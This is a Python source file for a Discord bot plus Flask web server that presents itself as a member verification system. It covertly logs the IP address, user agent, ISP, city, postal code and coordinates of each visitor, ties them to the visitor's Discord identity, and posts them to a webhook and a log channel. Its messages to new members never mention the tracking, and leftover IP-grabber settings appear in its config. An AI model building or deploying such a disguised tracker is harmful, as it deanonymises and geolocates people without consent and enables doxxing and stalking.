import discord
from discord import app_commands
from discord.ext import commands
import traceback
import requests
import base64
import httpagentparser
import os
import asyncio
import threading
import secrets
import json
from datetime import datetime
from typing import Dict, Optional, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from flask import Flask, jsonify, request, send_from_directory, abort

__app__ = "Discord Verification Bot Core"
__description__ = "Bot de verificación de Discord con sistema de tracking de IP - Core Module"
__version__ = "v3.2 - Core Only"

def extract_id(value):
    if not value or value == "0":
        return 0
    if "/" in value:
        return int(value.split("/")[-1])
    return int(value)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GUILD_ID = extract_id(os.environ.get("GUILD_ID", "0"))
VERIFIED_ROLE_ID = extract_id(os.environ.get("VERIFIED_ROLE_ID", "0"))
LOG_CHANNEL_ID = extract_id(os.environ.get("LOG_CHANNEL_ID", "0"))
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK", "")
VERIFICATION_URL = os.environ.get("VERIFICATION_URL", "").strip()

verification_tokens = {}

config = {
    "webhook": WEBHOOK_URL,
    "image": "https://imgs.search.brave.com/geKqfzhGIij5BKTa-lps4eolKm8I6p-SYOlVNWUmrh0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzkzL2Fj/LzU3LzkzYWM1Nzkx/ZGVlYjRjZDRhZThh/ODU3MzQ4NTY5Y2U1/LmpwZw",
    "imageArgument": True,
    "username": "Verification Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "vpnCheck": 1,
    "linkAlerts": True,
    "bugedImage": True,
    "antiBot": 1,
}

BASE_DIR = Path(__file__).resolve().parent

app = Flask(__name__, static_folder=None)
app.config['JSON_SORT_KEYS'] = False

_bot_thread: Optional[threading.Thread] = None


def build_verification_link(token: str) -> Optional[str]:
    """Construye la URL de verificación con el token como query param."""
    if not VERIFICATION_URL:
        return None

    try:
        parsed = urlparse(VERIFICATION_URL)
        query = dict(parse_qsl(parsed.query, keep_blank_values=True))
        query['token'] = token
        rebuilt = parsed._replace(query=urlencode(query))
        return urlunparse(rebuilt)
    except Exception:
        separator = '&' if '?' in VERIFICATION_URL else '?'
        return f"{VERIFICATION_URL}{separator}token={token}"


def create_verification_view(link: Optional[str]) -> Optional[discord.ui.View]:
    """Crea el botón de verificación si hay link configurado."""
    if not link:
        return None

    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Verificar", style=discord.ButtonStyle.link, url=link, emoji="✅"))
    return view


def get_client_ip() -> str:
    """Obtiene la IP del cliente respetando cabeceras de proxy."""
    forwarded_for = request.headers.get('X-Forwarded-For', '')
    if forwarded_for:
        return forwarded_for.split(',')[0].strip()
    return (request.remote_addr or '0.0.0.0').strip()


@app.route('/', methods=['GET'])
def serve_index():
    """Sirve la página principal y registra la visita."""
    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    threading.Thread(target=log_page_visit, args=(ip, user_agent, request.path), daemon=True).start()
    return send_from_directory(BASE_DIR, 'index.html')


@app.route('/verificar', methods=['POST'])
def verificar_endpoint():
    """Endpoint para procesar la verificación vía bot."""
    payload = request.get_json(silent=True) or request.form or {}
    token = (payload.get('token') or '').strip()
    if not token:
        response = {"success": False, "message": "Token requerido"}
        return jsonify(response), 400

    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')

    result = verify_user_token(token, ip, user_agent)
    status_code = result.pop('status_code', 200)
    return jsonify(result), status_code


@app.route('/status', methods=['GET'])
def status_endpoint():
    """Expone el estado actual del bot."""
    result = get_bot_status()
    status_code = result.pop('status_code', 200)
    return jsonify(result), status_code


@app.route('/<path:filename>', methods=['GET'])
def serve_static(filename: str):
    """Sirve cualquier activo estático en el mismo directorio."""
    target = BASE_DIR / filename
    if target.is_file():
        return send_from_directory(BASE_DIR, filename)
    abort(404)

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
bot_ready = False

@bot.event
async def on_ready():
    global bot_ready
    bot_ready = True
    print(f'✅ Bot conectado como {bot.user}', flush=True)
    try:
        synced = await bot.tree.sync()
        print(f'✅ {len(synced)} comandos sincronizados', flush=True)
    except Exception as e:
        print(f'❌ Error sincronizando comandos: {e}', flush=True)
    
    if LOG_CHANNEL_ID and LOG_CHANNEL_ID != 0:
        try:
            channel = bot.get_channel(LOG_CHANNEL_ID)
            if channel:
                embed = discord.Embed(
                    title="🤖 Bot Iniciado",
                    description="El sistema de logging está activo y listo para detectar visitas.",
                    color=0x00FF00,
                    timestamp=datetime.utcnow()
                )
                await channel.send(embed=embed)
                print(f'✅ Mensaje de inicio enviado al canal {LOG_CHANNEL_ID}', flush=True)
        except Exception as e:
            print(f'❌ Error enviando mensaje de inicio: {e}', flush=True)

@bot.event
async def on_member_join(member):
    try:
        if member.guild.id != GUILD_ID:
            return
        
        print(f'👤 Nuevo miembro: {member.name} (ID: {member.id})', flush=True)
        
        verification_token = secrets.token_urlsafe(32)
        verification_tokens[verification_token] = {
            'user_id': member.id,
            'username': str(member),
            'joined_at': datetime.now().isoformat()
        }

        verification_link = build_verification_link(verification_token)
        if not verification_link:
            print('⚠️ VERIFICATION_URL no configurado o inválido. No se enviará botón/link en el mensaje.', flush=True)
        view = create_verification_view(verification_link)
        
        embed = discord.Embed(
            title="🔐 Verificación Requerida",
            description=f"¡Bienvenido/a a **{member.guild.name}**!\n\nPara acceder al servidor, necesitas verificarte usando el token que se te proporcionará.",
            color=0x00FF00
        )
        instrucciones = [
            "Presiona el botón **Verificar** para abrir la página oficial",
            "La página detectará tu token y procesará la verificación",
            "Si no se abre el enlace, copia el token manualmente"
        ]
        embed.add_field(name="📋 Instrucciones", value="\n".join(f"{idx}. {texto}" for idx, texto in enumerate(instrucciones, start=1)), inline=False)
        embed.add_field(name="🔑 Token de Verificación", value=f"`{verification_token}`", inline=False)
        if verification_link:
            embed.add_field(name="🌐 Acceso rápido", value=f"[Haz clic aquí para verificarte]({verification_link})", inline=False)
        else:
            embed.add_field(name="🌐 Acceso rápido", value="Configura la variable `VERIFICATION_URL` para habilitar el botón automático.", inline=False)
        embed.set_footer(text="Este token es único y solo funciona una vez")
        
        try:
            await member.send(embed=embed, view=view)
            print(f'✅ Mensaje de verificación enviado a {member.name}', flush=True)
        except discord.Forbidden:
            print(f'❌ No se pudo enviar MD a {member.name} (DMs cerrados)', flush=True)
            
            for channel in member.guild.text_channels:
                if channel.permissions_for(member.guild.me).send_messages:
                    try:
                        fallback_embed = embed.copy()
                        fallback_view = create_verification_view(verification_link)
                        await channel.send(
                            f'{member.mention} revisa este mensaje para completar tu verificación.',
                            embed=fallback_embed,
                            view=fallback_view,
                            delete_after=60
                        )
                        break
                    except:
                        continue
    
    except Exception as e:
        print(f'❌ Error en on_member_join: {e}', flush=True)
        print(traceback.format_exc(), flush=True)

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def get_ip_info(ip: str) -> Optional[Dict]:
    """Obtiene información de IP de forma segura"""
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info and info.get("status") == "fail":
            return None
        return info
    except Exception as e:
        print(f'⚠️ Error obteniendo info de IP: {e}', flush=True)
        return None

def parse_user_agent(useragent: str) -> Tuple[str, str]:
    """Parsea el user agent para obtener OS y navegador"""
    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
        return os_name, browser
    except:
        return "Unknown", "Unknown"

def sendPageVisitLog(ip, useragent, page_path="/"):
    """Envía log de visita a la página principal"""
    try:
        print(f'📊 Procesando visita - IP: {ip}, Path: {page_path}', flush=True)
        
        os_name, browser = parse_user_agent(useragent)
        info = get_ip_info(ip)
        
        description = create_visit_description(ip, info, os_name, browser, useragent, page_path)
        
        if WEBHOOK_URL:
            embed_data = {
                "username": "Page Visit Logger",
                "embeds": [{
                    "title": "👁️‍🗨️ Nueva Visita Detectada",
                    "color": 0x3498db,
                    "description": description,
                    "timestamp": datetime.utcnow().isoformat(),
                    "footer": {
                        "text": f"Página: {page_path}"
                    }
                }]
            }
            
            try:
                requests.post(WEBHOOK_URL, json=embed_data, timeout=5)
                print(f'✅ Log enviado a webhook', flush=True)
            except Exception as e:
                print(f'❌ Error enviando a webhook: {e}', flush=True)
        
        if bot_ready and bot.loop:
            asyncio.run_coroutine_threadsafe(
                send_visit_log_to_channel(ip, info, os_name, browser, useragent, page_path),
                bot.loop
            )
        else:
            print('⚠️ Bot no está listo para enviar logs', flush=True)
        
    except Exception as e:
        print(f'❌ Error enviando log de visita: {e}', flush=True)
        print(traceback.format_exc(), flush=True)

def create_visit_description(ip, info, os_name, browser, useragent, page_path):
    """Crea la descripción para el embed de visita"""
    if info:
        return f"""**🌐 Nueva Visita a la Página**
    
**📍 Información de IP:**
> **IP:** `{ip}`
> **Proveedor:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **País:** `{info.get('country', 'Unknown')}`
> **Región:** `{info.get('regionName', 'Unknown')}`
> **Ciudad:** `{info.get('city', 'Unknown')}`
> **Código Postal:** `{info.get('zip', 'Unknown')}`
> **Coordenadas:** `{str(info.get('lat', 'N/A'))}, {str(info.get('lon', 'N/A'))}`
> **Zona Horaria:** `{info.get('timezone', 'Unknown')}`
> **Móvil:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot/Hosting:** `{info.get('hosting', False)}`

**💻 Información del PC:**
> **OS:** `{os_name}`
> **Navegador:** `{browser}`

**🔍 User Agent:**
```
{useragent}
```"""
    else:
        return f"""**🌐 Nueva Visita a la Página**
    
**📍 Información de IP:**
> **IP:** `{ip}`
> ⚠️ No se pudo obtener información adicional de geolocalización

**💻 Información del PC:**
> **OS:** `{os_name}`
> **Navegador:** `{browser}`

**🔍 User Agent:**
```
{useragent}
```"""

async def send_visit_log_to_channel(ip, info, os_name, browser, useragent, page_path):
    """Envía el log de visita al canal de Discord"""
    try:
        if not LOG_CHANNEL_ID or LOG_CHANNEL_ID == 0:
            print('ℹ️ Canal de logs no configurado - Omitiendo logging', flush=True)
            return

        channel = bot.get_channel(LOG_CHANNEL_ID)
        if not channel:
            print(f'⚠️ Canal de logs {LOG_CHANNEL_ID} no encontrado', flush=True)
            return
        
        embed = discord.Embed(
            title="👁️‍🗨️ Nueva Visita Detectada",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        embed.add_field(
            name="📍 IP y Ubicación",
            value=f"**IP:** `{ip}`\n" + (
                f"**País:** {info.get('country', 'Unknown')}\n"
                f"**Ciudad:** {info.get('city', 'Unknown')}\n"
                f"**Región:** {info.get('regionName', 'Unknown')}"
                if info else "⚠️ Info no disponible"
            ),
            inline=False
        )
        
        if info:
            embed.add_field(
                name="🌐 Proveedor de Internet",
                value=f"**ISP:** {info.get('isp', 'Unknown')}\n"
                      f"**Organización:** {info.get('org', 'Unknown')}\n"
                      f"**ASN:** {info.get('as', 'Unknown')}",
                inline=False
            )
            
            embed.add_field(
                name="📊 Detalles Adicionales",
                value=f"**Código Postal:** {info.get('zip', 'N/A')}\n"
                      f"**Zona Horaria:** {info.get('timezone', 'Unknown')}\n"
                      f"**VPN/Proxy:** {info.get('proxy', 'No')}\n"
                      f"**Hosting:** {info.get('hosting', 'No')}",
                inline=False
            )
        
        embed.add_field(
            name="💻 Sistema",
            value=f"**OS:** {os_name}\n**Navegador:** {browser}",
            inline=True
        )
        
        embed.add_field(
            name="📄 Página",
            value=f"`{page_path}`",
            inline=True
        )
        
        embed.set_footer(text=f"User Agent: {useragent[:100]}...")
        
        await channel.send(embed=embed)
        print(f'✅ Embed de visita enviado al canal de logs', flush=True)
    
    except Exception as e:
        print(f'❌ Error en send_visit_log_to_channel: {e}', flush=True)
        print(traceback.format_exc(), flush=True)

def sendVerificationLog(ip, useragent, user_data):
    """Envía log de verificación"""
    try:
        os_name, browser = parse_user_agent(useragent)
        info = get_ip_info(ip)
        
        description = create_verification_description(ip, info, os_name, browser, useragent, user_data)
        
        embed_data = {
            "username": "Verification Logger",
            "embeds": [{
                "title": "✅ Nueva Verificación Completada",
                "color": 0x00FF00,
                "description": description,
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        
        if WEBHOOK_URL:
            requests.post(WEBHOOK_URL, json=embed_data, timeout=5)
            print(f'✅ Log enviado a webhook para usuario {user_data["username"]}', flush=True)
        
        asyncio.run_coroutine_threadsafe(
            send_log_to_channel(user_data, ip, info, os_name, browser, useragent),
            bot.loop
        )
        
    except Exception as e:
        print(f'❌ Error enviando log: {e}', flush=True)

def create_verification_description(ip, info, os_name, browser, useragent, user_data):
    """Crea la descripción para el embed de verificación"""
    if info:
        return f"""**🎉 Usuario Verificado!**
    
**👤 Usuario de Discord:**
> **Username:** `{user_data['username']}`
> **ID:** `{user_data['user_id']}`
> **Unido al servidor:** `{user_data['joined_at']}`

**🌐 Información de IP:**
> **IP:** `{ip}`
> **Proveedor:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **País:** `{info.get('country', 'Unknown')}`
> **Región:** `{info.get('regionName', 'Unknown')}`
> **Ciudad:** `{info.get('city', 'Unknown')}`
> **Coordenadas:** `{str(info.get('lat', 'N/A'))}, {str(info.get('lon', 'N/A'))}`
> **Zona Horaria:** `{info.get('timezone', 'Unknown')}`
> **Móvil:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot/Hosting:** `{info.get('hosting', False)}`

**💻 Información del PC:**
> **OS:** `{os_name}`
> **Navegador:** `{browser}`

**🔍 User Agent:**
```
{useragent}
```"""
    else:
        return f"""**🎉 Usuario Verificado!**
    
**👤 Usuario de Discord:**
> **Username:** `{user_data['username']}`
> **ID:** `{user_data['user_id']}`
> **Unido al servidor:** `{user_data['joined_at']}`

**🌐 Información de IP:**
> **IP:** `{ip}`

**💻 Información del PC:**
> **OS:** `{os_name}`
> **Navegador:** `{browser}`

**🔍 User Agent:**
```
{useragent}
```"""

async def send_log_to_channel(user_data, ip, info, os_name, browser, useragent):
    """Envía el log de verificación al canal de Discord"""
    try:
        if not LOG_CHANNEL_ID or LOG_CHANNEL_ID == 0:
            print('ℹ️ Canal de logs no configurado - Omitiendo logging', flush=True)
            guild = bot.get_guild(GUILD_ID)
            if guild:
                member = guild.get_member(user_data['user_id'])
                if member:
                    role = guild.get_role(VERIFIED_ROLE_ID)
                    if role:
                        await member.add_roles(role)
                        print(f'✅ Rol verificado asignado a {member.name}', flush=True)
                        try:
                            await member.send("🎉 ¡Verificación completada! Ya tienes acceso al servidor.")
                        except:
                            pass
            return

        channel = bot.get_channel(LOG_CHANNEL_ID)
        if not channel:
            print(f'ℹ️ Canal de logs {LOG_CHANNEL_ID} no encontrado - Omitiendo logging', flush=True)
            return
        
        embed = discord.Embed(
            title="✅ Nueva Verificación Completada",
            color=0x00FF00,
            timestamp=datetime.utcnow()
        )
        
        embed.add_field(name="👤 Usuario", value=f"**Username:** {user_data['username']}\n**ID:** {user_data['user_id']}", inline=False)
        
        if info:
            embed.add_field(
                name="🌐 Ubicación",
                value=f"**IP:** `{ip}`\n**País:** {info.get('country', 'Unknown')}\n**Ciudad:** {info.get('city', 'Unknown')}\n**Proveedor:** {info.get('isp', 'Unknown')}",
                inline=True
            )
        else:
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        
        embed.add_field(name="💻 Sistema", value=f"**OS:** {os_name}\n**Navegador:** {browser}", inline=True)
        
        await channel.send(embed=embed)
        print(f'✅ Embed enviado al canal de logs', flush=True)
        
        guild = bot.get_guild(GUILD_ID)
        if guild:
            member = guild.get_member(user_data['user_id'])
            if member:
                role = guild.get_role(VERIFIED_ROLE_ID)
                if role:
                    await member.add_roles(role)
                    print(f'✅ Rol verificado asignado a {member.name}', flush=True)
                    
                    try:
                        await member.send("🎉 ¡Verificación completada! Ya tienes acceso al servidor.")
                    except:
                        pass
    
    except Exception as e:
        print(f'❌ Error en send_log_to_channel: {e}', flush=True)
        print(traceback.format_exc(), flush=True)

# Funciones para uso con HTML personalizado
def verify_user_token(token: str, ip: str, user_agent: str) -> Dict:
    """
    Función principal para verificación desde HTML personalizado
    Returns JSON response with status and message
    """
    try:
        if token not in verification_tokens:
            return {
                "success": False,
                "message": "Token inválido o ya utilizado",
                "status_code": 400
            }
        
        user_data = verification_tokens.pop(token)
        
        print(f'🔐 Verificación completada - Usuario: {user_data["username"]}, IP: {ip}', flush=True)
        
        sendVerificationLog(ip, user_agent, user_data)
        
        return {
            "success": True,
            "message": "¡Verificación exitosa!",
            "user_data": user_data,
            "status_code": 200
        }
    
    except Exception as e:
        print(f'❌ Error en verify_user_token: {e}', flush=True)
        print(traceback.format_exc(), flush=True)
        return {
            "success": False,
            "message": "Error interno del servidor",
            "status_code": 500
        }

def log_page_visit(ip: str, user_agent: str, page_path: str = "/") -> Dict:
    """
    Función para registrar visitas desde HTML personalizado
    Returns JSON response with status
    """
    try:
        sendPageVisitLog(ip, user_agent, page_path)
        
        return {
            "success": True,
            "message": "Visita registrada",
            "status_code": 200
        }
    
    except Exception as e:
        print(f'❌ Error en log_page_visit: {e}', flush=True)
        return {
            "success": False,
            "message": "Error registrando visita",
            "status_code": 500
        }

def get_bot_status() -> Dict:
    """
    Obtiene el estado actual del bot
    Returns JSON response with bot status
    """
    try:
        return {
            "success": True,
            "bot_connected": bot_ready and bot.is_ready(),
            "bot_user": str(bot.user) if bot_ready else None,
            "guild_id": GUILD_ID,
            "verified_role_id": VERIFIED_ROLE_ID,
            "log_channel_id": LOG_CHANNEL_ID,
            "status_code": 200
        }
    except Exception as e:
        return {
            "success": False,
            "message": str(e),
            "status_code": 500
        }

def start_bot_thread():
    """Inicia el bot de Discord en un hilo separado si aún no corre."""
    global _bot_thread
    if not BOT_TOKEN:
        app.logger.warning('BOT_TOKEN no configurado; el bot no se iniciará.')
        return

    if _bot_thread is None or not _bot_thread.is_alive():
        app.logger.info('Lanzando hilo del bot de Discord...')
        _bot_thread = threading.Thread(target=run_bot, name='discord-bot-thread', daemon=True)
        _bot_thread.start()


if hasattr(app, 'before_serving'):
    @app.before_serving
    def _start_bot_on_before_serving():
        start_bot_thread()


def run_flask():
    """Arranca el servidor Flask con la configuración adecuada para Render."""
    host = os.environ.get('HOST', '0.0.0.0')
    port = int(os.environ.get('PORT', '5000'))
    app.run(host=host, port=port, debug=False, use_reloader=False)


def run_bot():
    """Inicia el bot de Discord"""
    print('🤖 Iniciando bot de Discord...', flush=True)
    try:
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure as e:
        print(f"❌ ERROR DE AUTENTICACIÓN: {e}", flush=True)
        print("", flush=True)
        print("⚠️  El BOT_TOKEN parece ser inválido.", flush=True)
        print("📝 Por favor, verifica que:", flush=True)
        print("   1. El token es correcto (ve a Discord Developer Portal)", flush=True)
        print("   2. El token no tiene espacios al inicio o final", flush=True)
        print("   3. El bot está habilitado en Discord Developer Portal", flush=True)
        print("", flush=True)
        
        while True:
            import time
            time.sleep(60)
    except Exception as e:
        print(f"❌ ERROR INESPERADO: {e}", flush=True)
        while True:
            import time
            time.sleep(60)

if __name__ == '__main__':
    print(f"🚀 Iniciando {__app__} {__version__}", flush=True)
    print(f"Guild ID: {GUILD_ID}", flush=True)
    print(f"Verified Role ID: {VERIFIED_ROLE_ID}", flush=True)
    print(f"Log Channel ID: {LOG_CHANNEL_ID}", flush=True)
    if VERIFICATION_URL:
        print(f"Verification URL base: {VERIFICATION_URL}", flush=True)
    else:
        print("⚠️ VERIFICATION_URL no configurado. Los mensajes no incluirán botón/link.", flush=True)
    
    if not BOT_TOKEN:
        print("⚠️ BOT_TOKEN no configurado. El bot de Discord no se iniciará.", flush=True)
        print("La API Flask seguirá disponible, pero las funciones del bot fallarán.", flush=True)
    else:
        start_bot_thread()

    run_flask() 